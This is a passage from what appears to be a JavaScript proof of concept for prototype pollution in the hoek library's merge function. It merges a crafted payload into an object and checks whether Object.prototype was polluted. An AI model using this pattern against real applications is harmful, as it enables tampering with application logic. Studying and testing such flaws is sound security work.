  // as a directive to modify the object's [[Prototype]] internal slot rather than 
  // setting a regular property. This slips through if the library lacks prototype-key sanitization.
  hoek.merge(target, payload);

  // Verification: Check if Object.prototype was successfully polluted
  if ({}.exploited === true) {
